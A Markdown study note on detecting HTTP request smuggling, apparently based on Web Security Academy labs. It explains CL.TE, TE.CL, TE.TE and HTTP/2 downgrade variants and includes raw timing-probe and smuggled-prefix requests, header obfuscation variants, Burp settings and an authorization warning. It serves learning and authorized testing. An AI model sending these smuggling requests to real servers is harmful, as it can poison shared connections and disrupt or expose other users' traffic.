# HTTP Request Smuggling — Detection Techniques

## Purpose

The goal of detection is to answer:

```text
Do the front-end and back-end
disagree about request boundaries?
```

A useful workflow from the source is:

```text
1. Identify protocol
        ↓
2. Send timing probe
        ↓
3. Look for abnormal delay
        ↓
4. Confirm using differential responses
        ↓
5. Determine the exact variant
```

---

# 1. Main Detection Techniques

The source focuses on:

```text
TIMING-BASED DETECTION
        +
DIFFERENTIAL RESPONSE CONFIRMATION
```

Timing helps identify a probable vulnerability.

Differential responses provide stronger evidence that one request is interfering with another.

---

# 2. First Check — HTTP Version

Classic:

```text
CL.TE
TE.CL
TE.TE
```

techniques require:

```text
HTTP/1
```

If Burp is using HTTP/2:

```text
Repeater
   ↓
Inspector
   ↓
Request attributes
   ↓
Protocol
   ↓
HTTP/1
```

Do this before testing classic CL/TE variants.

---

# 3. Burp Content-Length Setting

For some deliberately malformed requests, especially TE.CL, Burp's automatic `Content-Length` correction can break the test.

Check:

```text
Repeater
   ↓
Update Content-Length
```

and disable it where required.

Then manually verify:

```http
Content-Length
```

before sending.

---

# 4. Timing-Based Detection

The idea is to deliberately create a situation where:

```text
Front-End thinks request is complete
             |
             v
Back-End thinks more data is coming
             |
             v
          WAITS
             |
             v
      RESPONSE DELAY
```

An unusual delay can therefore indicate that the two servers parsed the request differently.

---

# 5. Detecting CL.TE

For:

```text
CL.TE
```

we expect:

```text
Front-End = Content-Length
Back-End  = Transfer-Encoding
```

Timing probe from the source:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

---

# 6. Why the CL.TE Probe Delays

The front-end uses:

```http
Content-Length: 4
```

and forwards only the bytes that it considers part of the request.

The source explains that this omits:

```text
X
```

The back-end uses:

```http
Transfer-Encoding: chunked
```

and sees:

```text
1
A
```

meaning:

```text
Chunk size = 1
Chunk data = A
```

But it has not received the next chunk.

Therefore:

```text
Back-End:

"Where is the next chunk?"
        ↓
      WAIT
        ↓
Observable delay
```

Potential result:

```text
Possible CL.TE
```

---

# 7. CL.TE Timing Mental Model

```text
POST
 |
 v
FRONT-END
uses CL
 |
 | forwards incomplete
 | chunked message
 v
BACK-END
uses TE
 |
 | first chunk received
 | next chunk missing
 v
WAIT
 |
 v
DELAY
```

---

# 8. Detecting TE.CL

For:

```text
TE.CL
```

we expect:

```text
Front-End = Transfer-Encoding
Back-End  = Content-Length
```

Timing probe from the source:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

---

# 9. Why the TE.CL Probe Delays

The front-end uses:

```http
Transfer-Encoding: chunked
```

and sees:

```text
0
```

which terminates the chunked body.

The source explains that the front-end forwards only part of the request, omitting:

```text
X
```

The back-end instead uses:

```http
Content-Length: 6
```

and expects more body data.

Therefore:

```text
Back-End expects N bytes
        ↓
Not enough received
        ↓
WAIT
        ↓
Observable delay
```

Potential result:

```text
Possible TE.CL
```

---

# 10. TE.CL Timing Mental Model

```text
POST
 |
 v
FRONT-END
uses TE
 |
 | 0 = end
 v
BACK-END
uses CL
 |
 | expects more bytes
 v
WAIT
 |
 v
DELAY
```

---

# 11. Which Timing Test First?

This is important.

The source specifically warns that the:

```text
TE.CL timing test
```

can potentially disrupt other users if the application is actually vulnerable to:

```text
CL.TE
```

Therefore, to minimize disruption:

```text
FIRST
  ↓
CL.TE timing probe

If unsuccessful:
  ↓
TE.CL timing probe
```

Remember:

```text
CL.TE FIRST
TE.CL SECOND
```

---

# 12. Timing Is Not Final Confirmation

A delayed response tells you:

```text
Something interesting happened
```

but the next stage is:

```text
DIFFERENTIAL RESPONSE
```

The objective is to demonstrate:

```text
Attack Request
      ↓
changes
      ↓
Response to Next Request
```

---

# 13. Differential Response Technique

The source uses two requests:

```text
1. ATTACK REQUEST

2. NORMAL REQUEST
```

sent in quick succession.

Normally:

```text
Normal Request
      ↓
Normal Response
```

After poisoning:

```text
Attack Request
      ↓
Back-End state changed
      ↓
Normal Request
      ↓
Different Response
```

If the expected interference occurs:

```text
VULNERABILITY CONFIRMED
```

---

# 14. Baseline Normal Request

The source gives this example:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Normally this returns:

```text
HTTP 200
```

with search results.

The detection goal is to make this normal request produce something different.

For example:

```text
404 Not Found
```

---

# 15. Confirming CL.TE

Example from the source:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

For CL.TE:

```text
Front-End = CL
Back-End  = TE
```

The back-end finishes the chunked request before the front-end expects it to.

The following bytes:

```http
GET /404 HTTP/1.1
Foo: x
```

are therefore treated as the beginning of the next back-end request.

---

# 16. What Happens to the Next Request?

The subsequent normal request becomes conceptually:

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

Instead of the expected:

```text
200
```

the server responds:

```text
404
```

because the request has been altered by the smuggled prefix.

This is evidence that:

```text
Request 1
interfered with
Request 2
```

---

# 17. CL.TE Confirmation Shortcut

Remember:

```text
Attack:
smuggle GET /404
       ↓
Send normal request
       ↓
Normal request becomes /404...
       ↓
Receive 404
       ↓
CL.TE confirmed
```

---

# 18. Lab-Style CL.TE Confirmation

Your source's CL.TE confirmation lab uses:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Sending the request again causes the subsequent request to be affected.

Expected signal:

```text
404 Not Found
```

---

# 19. Confirming TE.CL

The source provides this TE.CL confirmation request:

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

Important Burp setting:

```text
Update Content-Length = OFF
```

The source also specifically notes that the final:

```text
0
```

must be followed by:

```text
\r\n\r\n
```

---

# 20. TE.CL Confirmation Logic

For:

```text
TE.CL
```

the front-end processes the request using chunked encoding.

The back-end instead uses:

```http
Content-Length
```

Everything beginning with:

```http
GET /404 HTTP/1.1
```

can become part of the next request processed by the back-end.

The subsequent normal request is therefore altered.

Expected signal:

```text
404
```

instead of its normal response.

---

# 21. Lab-Style TE.CL Confirmation

The source's TE.CL confirmation lab uses:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Expected behavior:

```text
First request
    ↓
poisons connection

Second request
    ↓
404 response
```

---

# 22. TE.TE Detection

TE.TE involves:

```text
Front-End supports TE
Back-End supports TE
```

but one server can be induced not to process the header because it is obfuscated.

Your source includes variations such as:

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

and duplicate forms such as:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

The goal is:

```text
Server A recognizes TE
Server B ignores TE
```

which can transform the behavior into an effective:

```text
CL.TE
```

or:

```text
TE.CL
```

discrepancy.

---

# 23. Confirmation Precaution — Different Connections

This is one of the most important notes from the source.

When confirming interference between requests:

```text
ATTACK REQUEST
```

and:

```text
NORMAL REQUEST
```

should be sent using:

```text
DIFFERENT NETWORK CONNECTIONS
```

Why?

If you send both over the same connection:

```text
you have not demonstrated
cross-request interference
in the intended way.
```

---

# 24. Keep Requests Similar

The source recommends using the same:

```text
URL
```

and:

```text
parameter names
```

as far as possible.

Why?

Modern applications may route requests according to:

```text
URL
Parameters
Load-balancing logic
```

For example:

```text
/search → Back-End A

/account → Back-End B
```

If:

```text
Attack → Back-End A
Normal → Back-End B
```

you may see no interference even when a vulnerability exists.

---

# 25. Send the Normal Request Quickly

There is a race condition.

After:

```text
Attack Request
```

you want your controlled:

```text
Normal Request
```

to be the next request that reaches the poisoned connection.

But another user's request may arrive first.

Therefore:

```text
Attack
  ↓
Normal immediately
```

The source notes that multiple attempts may be necessary on busy applications.

---

# 26. Load Balancers Can Cause False Negatives

Consider:

```text
              Front-End
              /       \
             v         v
        Back-End A  Back-End B
```

Attack:

```text
→ Back-End A
```

Normal request:

```text
→ Back-End B
```

Result:

```text
No visible interference
```

This does NOT necessarily prove that request smuggling is absent.

It may simply mean the requests reached different back-end systems.

---

# 27. Watch for Interference With Other Users

Suppose you send:

```text
Attack
      ↓
Your normal request
```

but your normal request is unaffected.

Then another user suddenly receives the poisoned result.

This means:

```text
Another user's request
reached the poisoned connection first
```

The source warns that continuing such testing can disrupt other users.

Only perform these techniques where you are explicitly authorized.

---

# 28. HTTP/2 Detection

For HTTP/2 request smuggling, first determine whether:

```text
HTTP/2 Front-End
       ↓
HTTP/1 Back-End
```

downgrading occurs.

Potential variants include:

```text
H2.CL
H2.TE
```

In Burp Repeater, verify:

```text
Inspector
   ↓
Request attributes
   ↓
Protocol = HTTP/2
```

---

# 29. Detecting H2.CL Behavior

H2.CL involves:

```text
Front-End → HTTP/2 framing
Back-End  → Content-Length
```

The source's H2.CL lab initially tests using:

```http
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```

The HTTP/2 front-end knows the real request length from the protocol.

But after downgrading, the HTTP/1 back-end receives:

```http
Content-Length: 0
```

If vulnerable:

```text
SMUGGLED
```

is treated as the beginning of the next back-end request.

---

# 30. H2.CL Confirmation Signal

In the source's lab:

```text
Send request repeatedly
        ↓
Every second request receives 404
```

This confirms that the subsequent request is being appended to the smuggled prefix.

Conceptually:

```text
Request 1
leaves prefix

Request 2
appended to prefix

      ↓

Unexpected response
```

---

# 31. Detecting H2.TE Behavior

H2.TE occurs when:

```text
HTTP/2 Front-End
       ↓
fails to remove TE
       ↓
HTTP/1 Back-End
       ↓
interprets chunked encoding
```

The relevant header is:

```http
Transfer-Encoding: chunked
```

HTTP/2 should not use chunked transfer encoding in the same way as HTTP/1.

If the header survives downgrading, it may create a request-boundary discrepancy at the HTTP/1 back-end.

---

# 32. Detection Decision Tree

```text
START
  |
  v
Which protocol?
  |
  +----------------------+
  |                      |
HTTP/1                 HTTP/2
  |                      |
  v                      v
CL.TE timing       Check downgrade
  |                      |
  | delayed?         +---+---+
  |                  |       |
 YES/NO            H2.CL   H2.TE
  |
  v
If CL.TE unsuccessful
  |
  v
TE.CL timing
  |
  v
Potential discrepancy?
  |
  v
Differential confirmation
  |
  v
Attack request
+
Normal request
  |
  v
Expected interference?
  |
  +------ YES ------> CONFIRMED
  |
  NO
  |
  v
Check routing,
connections,
load balancing,
and exact request format
```

---

# 33. Common Testing Mistakes

### Wrong Protocol

```text
Trying CL.TE using HTTP/2
```

Fix:

```text
Switch Repeater to HTTP/1
```

---

### Burp Changes Content-Length

```text
Carefully crafted request
        ↓
Burp recalculates CL
        ↓
Payload changes
```

Fix where required:

```text
Update Content-Length = OFF
```

---

### Wrong Chunk Size

Remember:

```text
Chunk sizes = HEXADECIMAL
```

Not decimal.

---

### Missing Final CRLF

For relevant TE.CL payloads, remember the source's warning:

```text
0\r\n\r\n
```

---

### Testing Only Once

Connection routing and other traffic can make behavior inconsistent.

A single failure may not be enough to understand what happened.

---

### Attack and Normal Request Reach Different Back-Ends

Possible result:

```text
FALSE NEGATIVE
```

Keep:

```text
URL
Parameters
```

similar where possible.

---

# 34. Evidence Strength

Think of evidence in stages:

```text
Unusual response
      ↓
Interesting

Repeatable timing delay
      ↓
Potential vulnerability

Controlled differential response
      ↓
Strong confirmation

Predictable interference with
subsequent request
      ↓
Confirmed desynchronization
```

---

# 35. Quick Detection Checklist

```text
[ ] Determine HTTP version

[ ] Establish normal baseline response

[ ] For classic attacks, use HTTP/1

[ ] Test CL.TE timing first

[ ] Only then test TE.CL timing if needed

[ ] Watch for repeatable delays

[ ] Confirm with differential responses

[ ] Use a recognizable path such as /404

[ ] Check Update Content-Length

[ ] Verify chunk sizes

[ ] Verify final CRLF sequences

[ ] Keep attack and normal URLs similar

[ ] Keep parameter names similar

[ ] Use different connections when confirming

[ ] Send controlled follow-up quickly

[ ] Consider load balancing

[ ] Avoid affecting unrelated users

[ ] For HTTP/2, check H2.CL/H2.TE behavior
```

---

# 36. Fast Revision

```text
CL.TE TIMING

Front = CL
Back  = TE
Back waits for next chunk
→ DELAY
```

```text
TE.CL TIMING

Front = TE
Back  = CL
Back waits for more bytes
→ DELAY
```

Then:

```text
TIMING
   ↓
possible vulnerability

DIFFERENTIAL RESPONSE
   ↓
confirmation
```

---

# Golden Rule

Never identify request smuggling based only on:

```text
"the response looked weird"
```

Instead build evidence:

```text
Baseline
   ↓
Controlled probe
   ↓
Repeatable behavior
   ↓
Differential confirmation
   ↓
Understand the parser disagreement
```

---

## Next Note

Continue to:

```text
Notes/Exploitation-Techniques.md
```

That file will organize the exploitation material from the source:

```text
Bypass front-end security controls
Reveal request rewriting
Capture other users' requests
Deliver reflected XSS
Web cache poisoning
Web cache deception
Response queue poisoning
Request tunnelling
```